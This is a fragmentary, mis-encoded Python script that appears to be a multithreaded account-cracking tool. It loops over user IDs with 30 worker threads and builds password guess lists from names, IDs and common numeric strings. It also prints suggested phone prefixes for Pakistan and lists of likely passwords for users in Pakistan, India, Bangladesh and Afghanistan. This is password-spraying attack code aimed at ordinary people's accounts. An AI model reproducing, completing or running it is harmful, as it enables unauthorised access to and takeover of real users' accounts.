 ...
 #   try:os.popen('play-audio Voice/INFO.mp3')
  ...
  #  elif Apps in["Y","y"]:
   ...
   # elif Apps in["N","n"]:
    ...
    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤")
    ...
    with ThreadPool(max_workers=30) as XYZCODERS:    
        ...
        for xyzcoderz in user:
            ...
            if pxc in ['1','01']:
            	...
            	pwx = [xyzcoderz,uid,'Karnataka','sangma','57575751','57272300','59039200']
            elif pxc in ['5','05']:
            	pwx = [xyzcoderz,uid,'223344','111222','224466','009988','445566','135790','111222333']
            elif pxc in ['6','06']:
    ...
    print()
    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€") 
 ...
 #   try:os.popen('play-audio Voice/INFO.mp3')
  ...
  #  elif Apps in["Y","y"]:
   ...
   # elif Apps in["N","n"]:
    ...
    line()
    print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€") 
    print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
    ...
    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€") ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
    YounisXYZ = []
